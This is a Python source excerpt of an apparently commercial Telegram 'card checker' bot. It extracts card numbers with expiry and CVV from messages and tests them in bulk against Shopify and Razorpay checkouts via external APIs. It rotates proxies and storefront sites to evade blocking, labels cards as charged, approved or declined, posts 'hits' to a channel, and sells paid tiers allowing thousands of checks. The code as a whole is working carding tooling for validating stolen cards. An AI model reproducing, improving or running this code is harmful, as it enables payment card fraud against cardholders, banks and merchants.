⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>""", he

def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    el = f"\n<b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>" if extra_field else ""
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/dixit_nath'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>{el}
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

def format_rz_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/dixit_nath'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

# ====================== FORCE JOIN ======================
async def is_user_joined(user_id):
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached = _JOIN_CACHE.get(user_id)
    if cached and now - cached < 600:
        return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client(GetParticipantRequest(channel=cid, participant=user_id))
            if isinstance(r.participant, ChannelParticipantBanned):
                return False
        except UserNotParticipantError:
            return False
        except (ChatAdminRequiredError, ChannelPrivateError):
            pass
        except:
            pass
    _JOIN_CACHE[user_id] = now
    return True

async def force_join_check(event):
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    _JOIN_CACHE.pop(event.sender_id, None)
    await remove_joined_mark(event.sender_id)
    buttons = [
        [pbtn(bs("Join Channel"), url=JOIN_CHANNEL_LINK)],
        [pbtn(bs("Join Group"), url=JOIN_GROUP_LINK)],
        [pbtn(bs("I have joined"), data="check_joined")]
    ]
    text = f"""{PE} <b>{bs('Access Locked')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Join Both Chats to Unlock')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Channel')}:</b> <i>{bs('RAZOR X CHANNEL')}</i>
{PE} <b>{bs('Group')}:</b> <i>{bs('RAZOR X Chat')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('All Features Restricted')}</b>"""
    try:
        await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]], file=random.choice(FORCE_JOIN_IMAGES) if FORCE_JOIN_IMAGES else None)
    except:
        await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]])
    return False

# ====================== MAINTENANCE ======================
async def set_maintenance_mode(enabled):
    global _MAINTENANCE_CACHE
    try:
        async with aiofiles.open(MAINTENANCE_FILE, "w") as f:
            await f.write(json.dumps({"maintenance": enabled}))
        _MAINTENANCE_CACHE = {"enabled": enabled, "last_check": time.time()}
    except:
        pass

async def get_maintenance_mode():
    global _MAINTENANCE_CACHE
    now = time.time()
    if _MAINTENANCE_CACHE["enabled"] is not None and now - _MAINTENANCE_CACHE["last_check"] < 30:
        return _MAINTENANCE_CACHE["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE):
            return False
        async with aiofiles.open(MAINTENANCE_FILE, "r") as f:
            data = json.loads(await f.read())
            _MAINTENANCE_CACHE = {"enabled": data.get("maintenance", False), "last_check": now}
            return _MAINTENANCE_CACHE["enabled"]
    except:
        return False

async def check_maintenance(event):
    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, f"""{PE} <b>{bs('Maintenance')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Bot under maintenance')}</b>
{PE} <i>{bs('Try again later')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])
        return True
    return False

# ====================== ACCESS ======================
async def can_use(user_id, chat):
    await ensure_user(user_id)
    if await is_banned_user(user_id):
        return False, "banned"
    plan = (await get_user_plan(user_id)).title()
    return True, f"{plan}_private" if chat.id == user_id else f"{plan}_group"

async def get_user_access(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id):
        return False, "banned", "Bronze"
    plan = (await get_user_plan(event.sender_id)).title()
    return True, f"{plan}_private" if event.chat.id == event.sender_id else f"{plan}_group", plan

def get_cc_limit(plan, uid=None):
    if uid and uid in ADMIN_ID:
        return 10000
    p = plan.title() if plan else "Bronze"
    if p == "X": return 10000
    if p == "Root": return 5000
    if p == "Elite": return 2500
    if p == "Core": return 1500
    return 0

def is_paid_plan(plan):
    return plan.title() in PAID_TIERS if plan else False

async def send_group_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Group Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Free users')} → {bs('group only')}</b>
{PE} <i>{bs('Upgrade for private access')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["gem"]])

async def send_premium_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Premium Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('This feature requires an active plan')}</b>
{PE} <i>{bs('Use /plan to see available plans')}</i>""", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/dixit_nath")]], emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])

def banned_user_message():
    return f"""{PE} <b>{bs('Banned')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Not allowed')}</b>
{PE} <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>""", [CE["stop"], CE["stop"], CE["warn"], CE["info"]]

# ====================== UTILITIES ======================
def extract_cc(text):
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def is_valid_url_or_domain(url):
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try: d = urlparse(url).netloc
        except: return False
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d))

def extract_urls_from_text(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            norm = normalize_site_url(m.group(1).rstrip('/'))
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm); result.append(norm)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            norm = normalize_site_url(cleaned)
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm); result.append(norm)
    return result

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        if 0 < int(pp) <= 65535: h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else: return None
    if not h or not p: return None
    try:
        if not (0 < int(p) <= 65535): return None
    except: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
            if r.status == 200: return True, (await r.json()).get('ip', '?')
            return False, None
    except Exception as e:
        return False, str(e)

async def get_bin_info(cn):
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}') as r:
                if r.status != 200:
                    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                d = await r.json(content_type=None)
                return {"brand": d.get('brand', '-'), "type": d.get('type', '-'), "level": d.get('level', '-'), "bank": d.get('bank', '-'), "country": d.get('country_name', '-'), "flag": d.get('country_flag', '🏳️')}
    except:
        return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}

# ====================== SHOPIFY API ======================
def build_shopify_api_url(site, cc, proxy_data=None):
    if not site.startswith('http'): site = f'https://{site}'
    url = f'{SHOPIFY_API_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url

def classify_shopify_response(rj):
    ar = str(rj.get('Response', ''))
    if ar.upper() == 'DS_REQUIRED': ar = '3DS_REQUIRED'
    st = rj.get('Status', False)
    price = rj.get('Price', '-')
    gw = rj.get('Gate', rj.get('Gateway', 'Shopify'))
    if price is not None and price != '-': price = f"${price}"
    rl = ar.lower()
    if is_site_error(ar) or is_proxy_error(ar):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "SiteError"}
    ch = ['order_paid', 'order_placed', 'order_confirmed', 'thank you', 'payment successful', 'order_completed', 'charged', 'order_created', 'order confirmed']
    ap = ['otp_required', 'otp required', '3d_authentication', '3ds_required', '3d required', '3d_redirect', 'authentication_required', 'insufficient_funds', 'insufficient funds', 'cvc', 'ccn', 'ccn live cvv']
    dc = ['generic_decline', 'generic decline', 'do_not_honor', 'do not honor', 'stolen_card', 'lost_card', 'pickup_card', 'pick_up_card', 'restricted_card', 'restricted card', 'fraudulent', 'fraud suspected', 'fraud_suspected', 'expired_card', 'expired card', 'transaction_not_allowed', 'transaction not allowed', 'card_declined', 'card declined', 'processor_declined', 'processor declined', 'card_not_supported', 'card not supported', 'currency_not_supported', 'duplicate_transaction', 'revocation_of_authorization', 'no_action_taken', 'try_again_later', 'not_permitted', 'decline', 'your card was declined', 'payment_intent_authentication_failure', 'avs_check_failed', 'incorrect number', 'incorrect_number', 'invalid', 'invalid_number', 'decision_rule_block', 'generic_error']
    if any(k in rl for k in ch): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Charged"}
    if any(k in rl for k in ap): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    if any(k in rl for k in dc): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
    if st is True and not any(w in rl for w in ["decline", "denied", "failed", "error", "rejected", "refused", "fraud"]):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}

async def check_shopify_api(card, site, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_shopify_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "sp"))
        async with s.get(url) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
            try: rj = await r.json(content_type=None)
            except: return {"Response": "Invalid JSON", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
        result = classify_shopify_response(rj)
        result["card"] = card
        result["site"] = site
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        err = str(e)
        st2 = "SiteError" if is_site_error(err) or is_proxy_error(err) else "Declined"
        return {"Response": err[:100], "Price": "-", "Gateway": "Unknown", "Status": st2, "card": card, "site": site}

async def check_shopify_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    if not sites:
        return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
    tried_sites = set()
    tried_proxies = set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
        if rotator: site = rotator.pick_site(sites, exclude=tried_sites)
        else:
            available = [s for s in sites if s not in tried_sites] or list(sites)
            site = random.choice(available)
        tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            if rotator: proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies)
            else:
                available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
                proxy_data = random.choice(available_px)
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_shopify_api(card, site, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "SiteError":
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data: rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return result, sites.index(site) + 1
        if rotator:
            rotator.report_site_fail(site)
            if proxy_data and is_proxy_error(result.get("Response", "")):
                rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = result
        if attempt < max_retries - 1: await asyncio.sleep(0.3)
    if last:
        last["Status"] = "Error"
        return last, -1
    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1

async def test_shopify_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        url = build_shopify_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async with s.get(url) as resp:
            if resp.status != 200: return {'site': site, 'status': 'dead', 'price': '-', 'response': f'HTTP_{resp.status}'}
            try: raw = await resp.json(content_type=None)
            except: return {'site': site, 'status': 'dead', 'price': '-', 'response': 'Invalid JSON'}
        rm = raw.get('Response', '')
        price = raw.get('Price', '-')
        if price and price != '-': price = f"${price}"
        if is_site_error(rm.lower()): return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        if not is_truly_alive(rm, price): return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        return {'site': site, 'status': 'alive', 'price': price, 'response': rm}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50]}

# ====================== RAZORPAY API ======================
def build_razorpay_api_url(site, cc, proxy_data=None):
    url = f"{RAZORPAY_API_URL}?cc={quote(cc, safe='')}"
    if site:
        url += f"&site={quote(site, safe='')}"
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url

def classify_razorpay_response(data):
    raw_response = data.get("Response", "")
    gateway = data.get("Gateway", "RazorPay")
    api_status = data.get("Status", "error")
    resp_lower = raw_response.lower()
    if any(k in resp_lower for k in ['charged', 'success', 'payment successful', 'order_paid']):
        status = "Charged"
    elif any(k in resp_lower for k in ['insufficient', 'otp', '3d', 'cvc', 'ccn', 'approved']):
        status = "Approved"
    elif any(k in resp_lower for k in ['malformed', 'timeout', 'connection', 'failed to perform', 'curl']):
        status = "RetryError"
    elif 'invalid format' in resp_lower:
        status = "RetryError"
    else:
        status = "Declined"
    if api_status == "error" and status not in ["RetryError", "Declined"]:
        status = "Declined"
    return {
        "Response": raw_response,
        "Price": "-",
        "Gateway": gateway,
        "Status": status,
        "card": data.get("Card", "")
    }

async def check_razorpay_api(card, site=None, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_razorpay_api_url(site, card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "rz"))
        async with s.get(url) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
            try:
                data = await r.json(content_type=None)
            except Exception as e:
                return {"Response": f"Invalid JSON: {e}", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
        result = classify_razorpay_response(data)
        result["card"] = card
        result["site"] = site
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": str(e)[:100], "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}

async def check_razorpay_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    if not sites:
        sites = [None]
    tried_sites = set()
    tried_proxies = set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}
        if rotator: site = rotator.pick_site(sites, exclude=tried_sites)
        else:
            available = [s for s in sites if s not in tried_sites] or list(sites)
            site = random.choice(available)
        if site: tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            if rotator: proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies)
            else:
                available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
                proxy_data = random.choice(available_px)
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_razorpay_api(card, site, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "RetryError":
            if rotator:
                if site: rotator.report_site_ok(site)
                if proxy_data: rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return result
        if rotator:
            if site: rotator.report_site_fail(site)
            if proxy_data and is_proxy_error(result.get("Response", "")):
                rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    if last:
        last["Status"] = "Error"
        return last
    return {"Response": "Max retries", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}

async def test_razorpay_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        result = await check_razorpay_api(test_card, site, proxy_data, user_id=0, http_session=http_session)
        if result.get("Status") == "RetryError":
            return {'site': site, 'status': 'dead', 'price': '-', 'response': result.get('Response', '')[:100]}
        return {'site': site, 'status': 'alive', 'price': '-', 'response': result.get('Response', '')[:100]}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50]}

# ====================== STATUS SYSTEM ======================
def _get_system_uptime():
    if not PSUTIL_AVAILABLE: return "N/A"
    uptime_seconds = int(time.time() - psutil.boot_time())
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

def _get_bot_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

def _create_progress_bar(percentage, length=10):
    filled_length = int(length * percentage / 100)
    return f"{'█' * filled_length}{'░' * (length - filled_length)} {percentage:.1f}%"

def _get_system_info():
    if not PSUTIL_AVAILABLE:
        return {"error": "psutil not installed", "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    try:
        cpu_usage = psutil.cpu_percent(interval=0)
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        network = psutil.net_io_counters()
        network_interfaces = psutil.net_if_addrs()
        active_interfaces = [i for i in network_interfaces.keys() if not i.startswith(('lo', 'docker', 'br-'))]
        return {
            "cpu_usage": cpu_usage, "cpu_count": cpu_count,
            "cpu_freq": cpu_freq.current if cpu_freq else 0,
            "total_memory": memory.total / (1024**3), "used_memory": memory.used / (1024**3),
            "available_memory": memory.available / (1024**3), "memory_percent": memory.percent,
            "total_disk": disk.total / (1024**3), "used_disk": disk.used / (1024**3),
            "free_disk": disk.free / (1024**3), "disk_percent": disk.percent,
            "hostname": socket.gethostname(), "os_name": platform.system(),
            "os_version": platform.version(), "architecture": platform.machine(),
            "bytes_sent": network.bytes_sent / (1024**2), "bytes_recv": network.bytes_recv / (1024**2),
            "active_interfaces": active_interfaces, "uptime_str": _get_system_uptime(),
            "bot_uptime_str": _get_bot_uptime(),
            "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "bot_restart_time": datetime.fromtimestamp(BOT_START_TIME).strftime("%Y-%m-%d %H:%M:%S"),
            "cpu_critical": cpu_usage > 90, "memory_critical": memory.percent > 90,
            "disk_critical": disk.percent > 90, "error": None
        }
    except Exception as e:
        return {"error": str(e), "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

async def _build_status_text():
    sys_info = await asyncio.get_event_loop().run_in_executor(None, _get_system_info)
    if sys_info.get("error"):
        return f"⌬ <b>𝐄𝐫𝐫𝐨𝐫</b> ↬ <code>❌ {sys_info['error']}</code>\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/dixit_nath'>𝑫@𝒙𝒊𝒕</a>"
    os_v = sys_info["os_version"].split("-")[0] if "-" in sys_info["os_version"] else sys_info["os_version"]
    s = sys_info
    msg = (
        f"⌬ <b>𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬</b> ↬ <code>✅ Active</code>\n――――――――――――――\n"
        f"⌬ <b>𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['bot_uptime_str']}</code>\n"
        f"⌬ <b>𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['uptime_str']}</code>\n"
        f"⌬ <b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭</b> ↬ <code>{s['bot_restart_time']}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐂𝐏𝐔</b> ↬ <code>{s['cpu_usage']:.1f}% ({s['cpu_count']} cores)</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['cpu_usage'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐑𝐀𝐌</b> ↬ <code>{s['used_memory']:.2f}GB / {s['total_memory']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['memory_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐃𝐢𝐬𝐤</b> ↬ <code>{s['used_disk']:.2f}GB / {s['total_disk']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['disk_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐍𝐞𝐭𝐰𝐨𝐫𝐤</b> ↬ <code>↑ {s['bytes_sent']:.1f}MB ↓ {s['bytes_recv']:.1f}MB</code>\n"
    )
    if s["cpu_critical"] or s["memory_critical"] or s["disk_critical"]:
        msg += "\n⚠️ <b>Warning:</b> System resources critically low!"
    msg += f"\n――――――――――――――\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/dixit_nath'>𝑫@𝒙𝒊𝒕</a>"
    return msg

# ====================== HIT NOTIFICATIONS ======================
async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
    if not HIT_CHANNEL_ID:
        return
    try:
        prem = await is_premium_user(uid)
        tag = bs("Premium") if prem else bs("Free Trial")
        sv = str(res.get("Status", "Charged")).upper()
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
        gw = res.get('Gateway', gate_type)
        resp = res.get('Response', '')
        if gate_type == "RazorPay":
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        else:
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('Price')} ➛ {res.get('Price', '-')}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
    except:
        pass

async def pin_charged_message(event, msg):
    try:
        if event.is_group: await msg.pin()
    except: pass

# ====================== MASS CHECK HELPERS ======================
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type):
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or "User"
    except:
        username, name = f"user_{uid}", "User"
    total = len(cards)
    checked = charged = approved = declined = errors = 0
    chat_id = event.chat_id
    mode = bs("C+A") if send_approved else bs("C only")
    st = time.time()
    hits = []
    workers = MRZ_PER_USER_WORKERS if sem_type == "mrz" else MSP_PER_USER_WORKERS
    user_sem = get_user_sem(uid, sem_type)
    http_session = await get_user_http_session(uid, sem_type)
    is_rz = gate_name == "RazorPay"
    sm = await styled_reply(event, f"<pre>{PE} {bs('Processing')} ━ {mode} ━ {gate_name} ━ {workers}{bs('w')}</pre>", emoji_ids=[CE["chart"]])
    last_ui = [0]
    lcd, lrd = "-", "-"

    def is_stopped():
        proc = process_store.get(uid)
        if not proc: return True
        return proc.get("stopped", False) if isinstance(proc, dict) else False

    async def update_ui():
        nonlocal last_ui
        now = time.time()
        if now - last_ui[0] < 3.0 or is_stopped(): return
        last_ui[0] = now
        kb = [[pbtn(f" {lcd}", "none")], [pbtn(f" {lrd}", "none")],
              [pbtn(f"{bs('C')} ━ {charged}", "none"), pbtn(f"{bs('A')} ━ {approved}", "none")],
              [pbtn(f"{bs('D')} ━ {declined}", "none"), pbtn(f"{bs('E')} ━ {errors}", "none")],
              [pbtn(f" {checked}/{total}", "none")], [pbtn(bs("Stop"), f"{stop_prefix}:{uid}")]]
        try: await styled_edit(sm, f"<pre>{PE} {bs('Processing')}...</pre>", buttons=kb, emoji_ids=[CE["star"]])
        except: pass

    async def worker(card):
        nonlocal checked, charged, approved, declined, errors, lcd, lrd
        if is_stopped(): return
        async with user_sem:
            if is_stopped(): return
            try:
                result = await check_func(card, http_session)
                if is_stopped(): return
